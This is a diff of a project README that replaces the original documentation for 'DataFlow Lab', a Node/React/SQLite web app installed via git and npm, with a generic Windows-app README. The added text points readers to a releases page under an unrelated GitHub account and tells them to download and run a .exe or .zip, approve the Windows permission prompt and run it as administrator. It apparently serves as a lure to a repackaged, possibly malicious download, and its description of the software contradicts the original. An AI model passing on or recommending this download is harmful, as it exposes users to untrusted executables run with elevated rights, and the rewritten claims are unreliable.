@@ -1,343 +1,159 @@
-<div align="center">
+# 📊 dataflow-lab - Clean, explore, and build faster
+
+[![Download dataflow-lab](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/annamaritenth380/dataflow-lab/releases)
+
+## 🚀 What is dataflow-lab?
+
+dataflow-lab is a local-first data workbench for Windows. It helps you clean data, explore it, make charts, and build dashboards in one place. It also creates SQL and Python pipelines for common tasks.
+
+You keep your data on your computer. That makes it a good fit for private files, small teams, and offline work.
+
+## ✨ What you can do
+
+- Import CSV, Excel, and SQLite files
+- Clean data with simple point-and-click tools
+- Filter, sort, and group rows
+- Build charts and tables
+- Create dashboards from your data
+- Generate SQL queries for analysis
+- Generate Python steps for data prep
+- Work with local files on your PC
+- Save your work for later use
+
+## 💻 System requirements
+
+- Windows 10 or Windows 11
+- 4 GB RAM minimum
+- 8 GB RAM recommended
+- 500 MB free disk space
+- Internet access for the first download
+
+## 📥 Download dataflow-lab
+
+Visit this page to download the Windows release:
+
+https://github.com/annamaritenth380/dataflow-lab/releases
 
-# ⚡ DataFlow Lab
+Look for the latest release and download the Windows file from that page.
+
+## 🛠️ Install on Windows
+
+1. Open the download page in your browser.
+2. Find the latest release at the top of the page.
+3. Download the Windows version of dataflow-lab.
+4. If the file is a `.zip`, open it and extract the contents.
+5. If the file is an `.exe`, double-click it to start the app.
+6. If Windows asks for permission, choose **Yes**.
+7. Wait for the app to finish opening.
 
-**A local-first data analytics workbench for cleaning, exploring, visualizing, and dashboarding your data — no cloud required.**
+## ▶️ First launch
+
+1. Start dataflow-lab from the file you downloaded.
+2. If you see a setup screen, follow the on-screen steps.
+3. Choose the folder where your data files are stored.
+4. Open a CSV, Excel, or SQLite file.
+5. Review the data in the main table.
+6. Use the tools on the side panel to clean or explore the data.
 
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?logo=node.js&logoColor=white)](https://nodejs.org)
-[![React](https://img.shields.io/badge/React-18-61DAFB?logo=react&logoColor=white)](https://react.dev)
-[![SQLite](https://img.shields.io/badge/SQLite-3-003B57?logo=sqlite&logoColor=white)](https://sqlite.org)
-[![Vite](https://img.shields.io/badge/Vite-5-646CFF?logo=vite&logoColor=white)](https://vitejs.dev)
-[![License](https://img.shields.io/badge/License-MIT-purple)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+## 🧭 Basic use
 
-[✨ Features](#-features) · [🖼️ Screenshots](#️-screenshots) · [🚀 Getting Started](#-getting-started) · [🏗️ Tech Stack](#️-tech-stack) · [🤝 Contributing](#-contributing)
+### Open data
+- Click **Open File**
+- Select a CSV, Excel, or SQLite file
+- Wait for the file to load
 
-<img src="screenshots/05_dashboard_builder.png" alt="DataFlow Lab Dashboard" width="100%" />
+### Clean data
+- Remove blank rows
+- Rename columns
+- Fix date and number fields
+- Replace empty values
+- Filter out rows you do not need
 
-</div>
+### Explore data
+- Sort by a column
+- Group rows by category
+- Check totals and counts
+- Look for missing values
+- Scan for repeated rows
 
----
+### Build charts
+- Choose a chart type
+- Pick the field for the X axis
+- Pick the field for the Y axis
+- Adjust labels and colors
+- Save the chart to your dashboard
 
-## 🌟 Overview
+### Make dashboards
+- Add one or more charts
+- Place tables beside charts
+- Rearrange panels
+- Save the dashboard layout
+- Open it again later
 
-DataFlow Lab is a full-stack data analytics application that runs entirely on your local machine. Import CSV, Excel, or JSON files and immediately explore, clean, visualize, and publish dashboards — all without sending a single byte to an external server.
+## 🔍 Working with SQL and Python
 
-The application pairs a **Node.js + Express + SQLite** backend with a **React + Vite + Chart.js** frontend. Every transformation you apply is translated into both **SQL** and **Python (pandas)**, giving you reproducible, portable pipelines you can run independently.
+dataflow-lab can create useful starting steps for analysis.
 
-> 🔒 **Privacy first.** All data is stored locally in SQLite. Nothing leaves your machine. No sign-up. No telemetry.
+### SQL
+Use SQL when you want to:
+- Filter rows
+- Join tables
+- Group data
+- Build saved queries
+- Reuse the same logic on the same files
 
----
+### Python
+Use Python when you want to:
+- Prepare data for later use
+- Repeat a cleaning task
+- Build a simple data pipeline
+- Export results after changes
 
-## ✨ Features
+The app writes starter code based on the data you load. You can use it as a base for your own work.
 
-### 🗂️ Data Explorer
-- Sortable, filterable, paginated table view for any imported dataset
-- Per-column statistics: null count, unique count, min/max/mean, top values, outlier count
-- Inline **SQL Query mode** — run custom `SELECT` statements directly against your data
-- Undo/redo on all sort and filter actions
+## 📂 Example workflow
 
-### 🔬 Studio — Clean · Visualize · Pipeline
-- **50+ cleaning operations** organized by category: column ops, missing data, text cleaning, numeric transforms, encoding, outlier detection, binning, date extraction, and more
-- Pipeline canvas: add, reorder, toggle, and preview each step before committing
-- Live preview after each operation — see row counts, schema changes, and affected values
-- 🤖 **AI-powered recommendations**: DataFlow Lab profiles your data automatically and surfaces actionable suggestions (fill nulls, trim whitespace, fix mixed case, log-transform skewed columns, detect outliers, etc.)
-- 15+ **chart types** in the visualization builder: bar, line, area, pie, donut, scatter, histogram, time series, stacked bar, and more
+1. Open a CSV file with sales data.
+2. Remove blank rows and fix column names.
+3. Group the data by month and product.
+4. Create a bar chart for sales totals.
+5. Add the chart to a dashboard.
+6. Save the cleaned file and the dashboard for later use.
 
-### 📊 Dashboard Builder
-- Drag-and-drop multi-widget canvas in a responsive **3-column grid**
-- **📈 Chart widgets** — embed any saved visualization with proper axis labels and bottom-center legend
-- **🔢 KPI widgets** — fully data-driven with two modes:
-  - **🟢 Basic mode**: dropdown Aggregation (COUNT/SUM/AVG/MIN/MAX) + Column + optional Filter → SQL auto-generated
-  - **🔴 SQL mode**: write any `SELECT` returning a single value; optional Trend % query
-  - Live **Preview** button to test before saving
-- **📝 Text / Notes widgets** — free-form annotations and insights
-- 5 layout sizes: Small, Medium, Large, Wide, Full (with proper `gridRow: span` for tall widgets)
-- **Export PNG** at 2× hi-res via html2canvas
-- 4 built-in dashboard templates
+## 🧩 Common file types
 
-### 💻 Code Generator
-- Every Studio operation generates executable **SQL** and **Python (pandas)** code automatically
-- Edit code freely in the browser and **Run SQL** live against your dataset
-- ⚠️ **Mutation detection**: warns before `UPDATE`/`DELETE`/`ALTER` — syncs changes back to Explorer and Studio automatically
-- Download as `.sql` or `.py` script
+dataflow-lab works well with:
 
-### 📤 Export Center
-- Dataset: **CSV**, **Excel (.xlsx)**, **JSON**
-- Code: **SQL script**, **Python (pandas) pipeline**
+- `.csv`
+- `.xlsx`
+- `.xls`
+- `.sqlite`
+- `.db`
 
-### ⚙️ Settings
-- Default preview row count (persisted via `localStorage`, read by Explorer on every mount)
-- Default chart library preference
+## ⌨️ Shortcuts and tips
 
----
+- Use the search box to find columns fast
+- Drag columns to change order
+- Right-click a table for more actions
+- Save often when you make changes
+- Keep source files in one folder
+- Use short file names with no extra symbols
 
-## 🖼️ Screenshots
+## 🧱 If the app does not open
 
-### 1️⃣ Dashboard — Home
-The home screen shows all imported datasets with key stats (rows, columns, missing values, numeric/categorical breakdown). A **Recommended Workflow** strip at the bottom guides new users through the full Import → Explore → Studio → Dashboard → Export journey.
+Try these steps:
 
-![Dashboard Home](screenshots/00_dashboard_home.png)
+1. Download the latest release again.
+2. Make sure the file finished downloading.
+3. Right-click the file and choose **Run as administrator**.
+4. Check that Windows did not block the file.
+5. Restart your PC and try again.
+6. Use the newest Windows update if the app still does not open
 
----
+## 🗂️ Project topics
 
-### 2️⃣ Data Explorer
-Browse your dataset in a sortable, filterable table. Click any column header for statistics, or switch to SQL Query mode.
+bi-tool, dashboard, data-analytics, data-cleaning, data-pipeline, data-visualization, eda, etl, local-first, nodejs, react, sql, sqlite
 
-![Data Explorer](screenshots/01_data_explorer.png)
+## 📌 What to expect
 
----
-
-### 3️⃣ SQL Query Mode
-Write any `SELECT` query directly in the explorer. Results appear inline with row counts.
-
-![SQL Query Mode](screenshots/02_sql_query_mode.png)
-
----
-
-### 4️⃣ Studio — Cleaning Pipeline
-Build a step-by-step cleaning pipeline. Each card shows the operation, affected columns, and row count after applying. The right panel surfaces AI-driven recommendations from automatic data profiling.
-
-![Studio Pipeline](screenshots/03_studio_pipeline.png)
-
----
-
-### 5️⃣ Studio — Visualization Builder
-Add charts alongside cleaning steps. Configure X/Y axes, aggregation, and row limit, then click **Run** to render the chart. Save it to use in a dashboard.
-
-![Studio Visualization](screenshots/04_studio_visualization.png)
-
----
-
-### 6️⃣ Dashboard Builder
-Combine charts, live KPI widgets, and text annotations on a multi-column canvas. Resize widgets and export the entire dashboard as a PNG.
-
-![Dashboard Builder](screenshots/05_dashboard_builder.png)
-
----
-
-### 7️⃣ Code Generator — SQL
-Every cleaning operation compiles to SQL. Edit and run the script live; write operations automatically sync back to the Explorer and Studio preview.
-
-![Code Generator SQL](screenshots/06_code_generator_sql.png)
-
----
-
-### 8️⃣ Code Generator — Python
-Switch to the Python tab to get the equivalent pandas pipeline. Copy or download the `.py` script to reproduce your entire transformation outside DataFlow Lab.
-
-![Code Generator Python](screenshots/07_code_generator_python.png)
-
----
-
-### 9️⃣ Export Center
-Download the dataset in CSV, Excel, or JSON, or export the generated SQL/Python scripts.
-
-![Export Center](screenshots/08_export_center.png)
-
----
-
-### 🔟 Settings
-Configure default row count for Explorer pagination and chart library preferences. Settings persist across sessions via `localStorage`.
-
-![Settings](screenshots/09_settings.png)
-
----
-
-## 🚀 Getting Started
-
-### 📋 Prerequisites
-
-| Requirement | Version |
-|---|---|
-| Node.js | 18 or higher |
-| npm | 8 or higher |
-
-### 📦 Installation
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/adin-alxndr/dataflow-lab.git
-cd dataflow-lab
-
-# 2. Install all dependencies (root + server + client) in one command
-npm run setup
-```
-
-> The `setup` script installs dependencies for the root, backend, and frontend automatically — no need to `cd` into each folder manually.
-
-### ▶️ Running
-
-**Option A — one command (recommended)**
-
-```bash
-npm start
-```
-
-This uses [`concurrently`](https://github.com/open-cli-tools/concurrently) to launch both the backend API (port 3001) and the frontend dev server (port 5173) in a single terminal.
-
-**Option B — two terminals (if you prefer)**
-
-```bash
-# Terminal 1 — backend API
-cd server && npm run dev
-
-# Terminal 2 — frontend
-cd client && npm run dev
-```
-
-Open **http://localhost:5173** in your browser.
-
-### 🗄️ Importing your first dataset
-
-1. Click **Dashboard** in the left sidebar
-2. Click **Import Dataset**
-3. Upload a **CSV**, **Excel (.xlsx/.xls)**, or **JSON** file — or paste a public URL
-4. DataFlow Lab auto-detects column types (`integer`, `real`, `text`, `date`) and computes statistics
-
-> 💡 **Supported sizes:** up to ~1M rows. For larger datasets, pre-aggregate with DuckDB or Polars first.
-
-### 🏗️ Build for Production
-
-```bash
-cd client
-npm run build
-# Output in client/dist/ — serve via Express backend or any static host
-```
-
----
-
-## 🏗️ Tech Stack
-
-### 🖥️ Backend
-| Package | Purpose |
-|---|---|
-| Express | HTTP server & REST API |
-| better-sqlite3 | Embedded SQLite (sync API, no server) |
-| multer | File upload handling |
-| xlsx | Excel file parsing and export |
-| uuid | Dataset and operation ID generation |
-
-### 🎨 Frontend
-| Package | Purpose |
-|---|---|
-| React 18 | UI framework |
-| Vite 5 | Dev server and build tool |
-| Chart.js + react-chartjs-2 | All chart rendering |
-| Zustand | Global state management |
-| react-hot-toast | Toast notifications |
-| Lucide React | Icon library |
-
----
-
-## 🧮 Cleaning Operations Reference
-
-| Category | Operations |
-|---|---|
-| 📋 **Column** | Select columns, rename, rename multiple, duplicate, merge, split, add formula, change type, drop |
-| 🗃️ **Rows** | Filter, remove by condition, sort, limit, sample, remove duplicates |
-| 🩹 **Missing Data** | Remove nulls, fill mean/median/mode/value/forward/backward, fill by group |
-| 🏷️ **Encoding** | Label encoding, one-hot encoding, binary (mode flag) encoding |
-| ✏️ **Text** | Lowercase, uppercase, capitalize, trim, replace, remove special chars, remove numbers, string length |
-| 🔢 **Numeric** | Normalize (0–1), normalize to range, z-score standardize, log transform, clip, absolute value, round, floor, ceil, rank, percentile |
-| 📉 **Outliers** | Remove by IQR, cap (Winsorize) by IQR, detect/flag by IQR |
-| 🪣 **Binning** | Equal-width bins, custom bin edges with optional string labels |
-| ➕ **Aggregation** | Group by + aggregate (COUNT/SUM/AVG/MIN/MAX) |
-| 🚩 **Conditions** | Create binary flag column, conditional replace |
-| 📅 **Date** | Extract year/month/day/weekday/hour/quarter, convert to date, date difference |
-
----
-
-## 🤝 Contributing
-
-Contributions are very welcome! DataFlow Lab is a side project with plenty of room to grow. Here's how to get involved:
-
-### 🐛 Reporting Bugs
-
-1. Check the [existing issues](https://github.com/adin-alxndr/dataflow-lab/issues) to avoid duplicates
-2. Open a new issue with the **Bug report** template
-3. Include:
-   - Steps to reproduce
-   - Expected vs actual behavior
-   - Browser and OS version
-   - A small sample dataset if relevant
-
-### 💡 Suggesting Features
-
-1. Open a [Feature Request](https://github.com/adin-alxndr/dataflow-lab/issues/new?template=feature_request.md) issue
-2. Describe the use case — *why* do you need this?
-3. Include examples, mockups, or references if you have them
-
-### 🔧 Submitting a Pull Request
-
-```bash
-# 1. Fork the repo and clone your fork
-git clone https://github.com/adin-alxndr/dataflow-lab.git
-cd dataflow-lab
-
-# 2. Create a feature or fix branch
-git checkout -b feat/your-feature-name
-# or
-git checkout -b fix/bug-description
-
-# 3. Install dependencies and start dev servers (see Getting Started)
-
-# 4. Make your changes, then commit with a descriptive message
-git commit -m "feat: add Parquet export to Export Center"
-
-# 5. Push and open a Pull Request against main
-git push origin feat/your-feature-name
-```
-
-### 📐 Commit Message Convention
-
-This project follows [Conventional Commits](https://www.conventionalcommits.org/):
-
-| Prefix | When to use |
-|---|---|
-| `feat:` | ✨ A new feature |
-| `fix:` | 🐛 A bug fix |
-| `docs:` | 📝 Documentation only |
-| `refactor:` | ♻️ Code change that isn't a fix or feature |
-| `perf:` | ⚡ Performance improvement |
-| `test:` | 🧪 Adding or updating tests |
-| `chore:` | 🔧 Build process, dependencies, tooling |
-
-### 🗺️ Good First Issues
-
-Looking for somewhere to start? Check issues tagged [`good first issue`](https://github.com/adin-alxndr/dataflow-lab/labels/good%20first%20issue). Some ideas:
-
-- 🌍 Add more date format detection patterns to `inferType`
-- 🎨 Add a dark mode theme toggle
-- 📊 Add a new chart type (heatmap, waterfall, bullet chart)
-- 🧪 Write unit tests for the SQL/Python code generators
-- 🌐 Add i18n / localization support
-- 📱 Improve mobile layout responsiveness
-- 📦 Add Parquet export via DuckDB-wasm
-
-### 📏 Code Style Guidelines
-
-- **JavaScript/JSX** — match the existing file style (no TypeScript, no enforced linting, but keep it readable and consistent)
-- **Backend routes** — follow the pattern in `cleaning.js`: validate params → generate SQL → return `{ success, ... }`
-- **Frontend components** — inline styles using CSS variables; no Tailwind, no CSS modules
-- **Statistical formulas** — if adding a new numeric operation, verify the formula mathematically, add a comment with the derivation, and make sure the SQL handles `NULL` and empty-string values correctly
-
-### 🙏 Thank You
-
-Every contribution — whether a bug report, a typo fix, or a new feature — makes DataFlow Lab better for everyone. Thank you for taking the time! 🎉
-
----
-
-## 📜 License
-
-[MIT](LICENSE) — free to use, modify, and distribute.
-
----
-
-<div align="center">
-
-Built with ❤️ · Running entirely on your machine · No cloud, no sign-up, no tracking
-
-⭐ If DataFlow Lab is useful to you, consider starring the repo!
-
-</div>
+dataflow-lab is built for local data work. It keeps the process simple, with a focus on loading data, shaping it, and turning it into useful views. It is a good match for users who want one app for cleaning, charts, and dashboard work without moving data to another service
